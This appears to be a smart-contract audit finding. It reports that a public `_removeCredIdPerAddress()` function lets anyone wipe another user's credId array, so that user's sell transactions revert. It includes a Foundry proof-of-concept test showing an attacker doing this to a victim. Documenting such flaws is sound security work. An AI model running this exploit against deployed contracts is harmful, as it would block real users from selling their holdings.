# Vulnerability details

## Impact
The `_removeCredIdPerAddress()` function have public visibility which allows a malicious actor to update the values of `_credIdsPerAddress`, `_credIdsPerAddressCredIdIndex` and `_credIdsPerAddressArrLength` maps on behalf of any user. 

A malicious actor can remove every element of the credId array of other users, making imposible for the user to sell since transaction will revert on `EmptyArray` on `_removeCredIdPerAddress()` function.

```Solidity
function test_poc_SellAction() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.startPrank(anyone);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);
        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        vm.stopPrank();

        vm.startPrank(user1);
        cred._removeCredIdPerAddress(1, anyone); // Atacker calls _removeCredIdPerAddress leaving credIds array empty for Anyone user            
        vm.stopPrank();
        vm.startPrank(anyone);
        vm.warp(block.timestamp + 10 minutes + 1 seconds);
        uint256 minPrice = bondingCurve.getSellPriceAfterFee(1, 1, 1);
        cred.sellShareCred(1, 1, minPrice); // Anyone tries to sell but fails because array is now empty
    }
```
